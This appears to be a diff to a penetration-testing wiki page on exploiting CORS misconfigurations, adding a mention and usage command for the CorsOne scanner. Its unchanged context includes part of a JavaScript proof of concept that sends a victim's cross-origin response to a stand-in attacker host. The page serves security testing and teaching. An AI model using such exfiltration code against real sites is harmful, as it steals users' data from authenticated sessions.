@@ -75,7 +75,7 @@ During a penetration test, exploiting CORS misconfigurations is difficult. The a
 
 However, it's possible to get a Proof-of-Concept using JavaScript by registring a domain (to abuse a CORS misconfiguration).
 
-### Tool
+### Tools
 
 The tool [CORScanner ](https://github.com/chenjj/CORScanner)is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.
 
@@ -104,7 +104,13 @@ function reqListener() {
     location='//atttacker.domain/log?response='+this.responseText; 
 };
 ```
+---
+The tool [CorsOne](https://github.com/omranisecurity/CorsOne) is a fast and accurate utility for detecting CORS misconfigurations, featuring multiple built-in test cases and automated checks for common bypass scenarios.
 
+```bash
+python3 CorsOne.py -u target.com
+```
+---
 ## Resources
 
 [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
